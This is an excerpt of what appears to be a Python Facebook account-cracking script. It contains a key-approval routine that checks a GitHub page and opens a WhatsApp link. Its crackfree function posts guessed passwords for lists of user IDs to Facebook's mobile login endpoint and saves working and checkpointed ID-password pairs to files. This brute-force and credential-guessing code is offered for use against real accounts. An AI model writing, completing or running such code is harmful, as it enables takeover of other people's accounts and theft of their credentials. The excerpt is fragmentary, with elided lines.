...
prinCP=[]
try:
    prox= requests.get('https://github.com/Avi-xwd-30/Avi-xwd-30/blob/main').text
...
╠══[Github                   • \33[1;38mavinash-xwd║\33[1;34m   
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Avi-xwd-30/Avi-xwd-30/blob/main').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+977 9702646134?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAVINASH-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•AVINASH-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " AVINASH, Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
